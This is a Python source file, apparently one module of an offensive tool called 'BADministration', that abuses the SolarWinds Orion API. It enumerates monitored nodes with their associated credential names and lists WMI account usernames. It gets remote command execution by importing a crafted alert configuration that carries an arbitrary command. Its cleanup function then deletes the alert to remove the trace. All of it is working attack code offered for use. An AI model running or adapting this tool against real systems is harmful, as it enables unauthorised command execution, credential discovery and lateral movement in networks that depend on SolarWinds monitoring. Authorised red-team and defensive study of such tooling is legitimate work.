import orionsdk
import requests
import string
import sys
import time
from cgi import escape
from prettytable import PrettyTable
from termcolor import colored

#http://solarwinds.github.io/OrionSDK/schema/

def swisconnect(npm_server, username, password):
	swis = orionsdk.SwisClient(npm_server, username, password)
	return swis
	
def headerdisplay(text):
	print colored('-------------------------------', 'grey', 'on_blue'),
	print colored(text.center(40, ' '), 'red', 'on_blue'),
	print colored('-------------------------------', 'grey', 'on_blue')
	return

def sw_enumerate(target, username, password, verbose):
	try:
		####Connection Setup
		requests.packages.urllib3.disable_warnings()
		swiconnection = swisconnect(target, username, password)	

		####Header
		headerdisplay("Solarwinds Enumeration")				
	
		####Query and Print Nodes
		nodequery = swiconnection.query("SELECT n.DisplayName, n.DNS, n.IPAddress, n.MachineType, c.Name FROM Orion.Nodes n JOIN Orion.DiscoveredNodes d ON n.IPAddress = d.IPAddress JOIN Orion.Credential c ON d.CredentialID = c.ID")
	
		if len(nodequery) == 0:
        		print('No nodes found.')
	       		return

		t = PrettyTable(['DisplayName', 'DNS', 'IP Address', 'Node Type', 'Credential Name'])

		for r in nodequery['results']:		
			t.add_row([r['DisplayName'], r['DNS'], r['IPAddress'], r['MachineType'], r['Name']])		
		print t

		####Query and Print Solarwinds WMI Accounts	
		cortexquery = swiconnection.query("SELECT UserName FROM Cortex.Orion.WindowsCredential")
	
		ct = PrettyTable(['WMI Query Accounts'])
		for z in cortexquery['results']:
			ct.add_row([z['UserName']])
		print ct
	except requests.exceptions.ConnectionError as error:
		print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
	except Exception as error:
		print colored("Error message - " + str(error), 'yellow', 'on_blue')


def sw_system_shell(target, username, password, command, verbose):
	try:
		####Connection Setup
		requests.packages.urllib3.disable_warnings()	
		swiconnection = swisconnect(target, username, password)

		####Header
		headerdisplay("Solarwinds System Commands")

		####Pre-Condition Trigger
		if verbose == True:
			print colored("Verbose Output - Solarwinds alert creation for System RCE.", 'green', 'on_blue')		
		
		importfile = './Solarwinds/cpl_alert.xml'

		if verbose == True:
			print colored("Verbose Output - Reading in Solarwinds alert template: " + importfile, 'green', 'on_blue')
		
		print colored("System command to be executed: " + command, 'yellow', 'on_blue')

		####Read in Solarwinds alert template. Will replace CMDGOESHERE with command variable	
		with open(importfile, 'r') as f:
			alert = f.read().replace('CMDGOESHERE',escape(command))
	
		if verbose == True:
			print colored("Verbose Output - Attempting to create Solarwinds alert.", 'green', 'on_blue')
	
		swiconnection.invoke('Orion.AlertConfigurations', 'Import', alert)
		print colored("The command should execute immediately; however, sometimes it can take 5 minutes. Run solarwinds-alertremove after.", 'yellow', 'on_blue', attrs=['blink'])

	except requests.exceptions.ConnectionError as error:
		print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
	except Exception as error:
		print colored("Error message - " + str(error), 'yellow', 'on_blue')
	
def sw_list_alerts(target, username, password, verbose):
	try:
		####Connection Setup
		requests.packages.urllib3.disable_warnings()	
		swiconnection = swisconnect(target, username, password)

		####Header
		headerdisplay("Solarwinds Alert List")
	
		if verbose == True:
			print colored("Verbose Output - Attempting to list Solarwinds alerts.", 'green', 'on_blue')

		alertenum = swiconnection.query("SELECT AlertID,Name FROM Orion.AlertConfigurations")

		if len(alertenum) == 0:
        		print('No alerts found.')
	       		return

		t = PrettyTable(['AlertID', 'Name', 'BADministration Alert'])
		
		for r in alertenum['results']:
			if r['Name'] == "CPL Alert":		
				t.add_row([r['AlertID'], r['Name'], "TRUE"])		
			else:
				t.add_row([r['AlertID'], r['Name'], ""])		
		print t

	except requests.exceptions.ConnectionError as error:
		print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
	except Exception as error:
		print colored("Error message - " + str(error), 'yellow', 'on_blue')

def sw_system_cleanup(target, username, password, verbose):
	try:
		####Connection Setup
		requests.packages.urllib3.disable_warnings()	
		swiconnection = swisconnect(target, username, password)

		####Header
		headerdisplay("Solarwinds Alert Clean Up")

		###Cleanup
		if verbose == True:
			print colored("Verbose Output - Attempting to delete Solarwinds alert ", 'green', 'on_blue')

		alertquery = swiconnection.query("SELECT AlertID,Name,Uri FROM Orion.AlertConfigurations WHERE Name = 'CPL Alert'")
		swiconnection.delete(alertquery['results'][0]['Uri'])

	except requests.exceptions.ConnectionError as error:
		print colored("Connection failed to Orion Server - " + target, 'yellow', 'on_blue')	
	except Exception as error:
		print colored("Error message - " + str(error), 'yellow', 'on_blue')
